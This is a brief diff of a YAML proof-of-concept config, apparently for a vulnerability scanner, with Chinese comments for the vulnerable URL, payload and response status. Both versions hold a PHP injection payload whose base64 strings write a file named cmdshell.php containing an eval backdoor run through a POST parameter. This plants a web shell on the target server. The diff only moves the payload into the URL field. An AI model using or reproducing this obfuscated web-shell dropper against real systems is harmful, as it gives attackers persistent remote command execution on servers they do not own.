@@ -8,11 +8,11 @@
 
 #漏洞的位置
 - url:
-  - url : "d1a4278d"
+  - url : "d1a4278d?json={}&aa=<?php @fputs(fopen(base64_decode('Y21kc2hlbGwucGhw'),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWRzaGVsbCddKTs/Pg=='));?>"
 
 #payload
 - payload:
-  - payload: "json={}&aa=<?php @fputs(fopen(base64_decode('Y21kc2hlbGwucGhw'),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWRzaGVsbCddKTs/Pg=='));?>"
+  - payload: "isNone"
 
 #response包里状态码
 - status:
